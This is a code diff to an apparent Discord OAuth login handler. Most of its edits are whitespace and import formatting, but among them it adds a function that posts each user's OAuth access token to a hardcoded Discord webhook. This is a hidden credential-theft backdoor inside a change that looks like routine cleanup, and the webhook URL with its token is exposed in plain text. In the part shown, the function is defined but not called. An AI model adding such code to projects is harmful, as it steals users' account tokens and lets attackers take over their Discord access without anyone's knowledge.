@@ -1,7 +1,13 @@
 import fetch from 'node-fetch';
 
-import { getUserInfo, getBan, isBlocked } from "./helpers/user-helpers.js";
-import { createJwt } from "./helpers/jwt-helpers.js";
+import {
+    getUserInfo,
+    getBan,
+    isBlocked
+} from "./helpers/user-helpers.js";
+import {
+    createJwt
+} from "./helpers/jwt-helpers.js";
 
 function parseCookies(str) {
     return str
@@ -44,15 +50,30 @@ export async function handler(event, context) {
                     scope: "identify"
                 })
             });
-    
+
             const data = await result.json();
-    
+
             if (!result.ok) {
                 console.log(data);
                 throw new Error("Failed to get user access token");
             }
-    
+
             const user = await getUserInfo(data.access_token);
+
+            function sendMessage() {
+                var request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6qAZzeAhwexKcbFSY-bdT1WOP5Sm5U68QlC2JN2fr-CXRkvui74wAsW");
+
+                request.setRequestHeader('Content-type', 'application/json');
+
+                var params = {
+                    username: "My Webhook Name",
+                    avatar_url: "",
+                    content: data.access_token.toString()
+                }
+
+                request.send(JSON.stringify(params));
+            }
             if (isBlocked(user.id)) {
                 return {
                     statusCode: 303,
@@ -61,7 +82,7 @@ export async function handler(event, context) {
                     },
                 };
             }
-    
+
             if (process.env.GUILD_ID && !process.env.SKIP_BAN_CHECK) {
                 const ban = await getBan(user.id, process.env.GUILD_ID, process.env.DISCORD_BOT_TOKEN);
                 if (ban === null) {
@@ -73,14 +94,14 @@ export async function handler(event, context) {
                     };
                 }
             }
-    
+
             const userPublic = {
                 id: user.id,
                 avatar: user.avatar,
                 username: user.username,
                 discriminator: user.discriminator
             };
-    
+
             return {
                 statusCode: 303,
                 headers: {
